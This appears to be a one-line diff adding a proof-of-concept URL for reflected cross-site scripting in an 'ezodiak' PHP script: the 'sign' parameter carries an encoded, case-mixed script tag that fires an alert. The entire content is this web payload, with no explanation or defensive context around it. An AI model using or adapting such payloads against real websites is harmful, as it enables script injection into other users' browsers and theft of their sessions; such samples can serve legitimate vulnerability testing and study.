@@ -1,0 +1,2 @@
+http://www.example.com/ezarticles/ezodiak/index.php?sign=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(309408771751)%3B&lt;/ScRiPt&gt;&amp;date=20090717
+
